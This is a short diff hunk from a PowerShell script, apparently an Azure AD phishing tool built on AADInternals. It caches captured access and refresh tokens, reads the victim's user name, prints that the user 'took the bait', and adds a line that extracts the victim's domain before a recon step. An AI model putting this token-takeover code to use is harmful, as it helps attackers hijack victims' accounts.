@@ -38,6 +38,7 @@ Add-AADIntAccessTokenToCache -AccessToken $access -RefreshToken $refresh
 
 $acc = Read-AADIntAccessToken $access
 $user = $acc.upn
+$domain = $user.Split("@")[1]
 Write-Output "$user took the bait."
 
 # recon
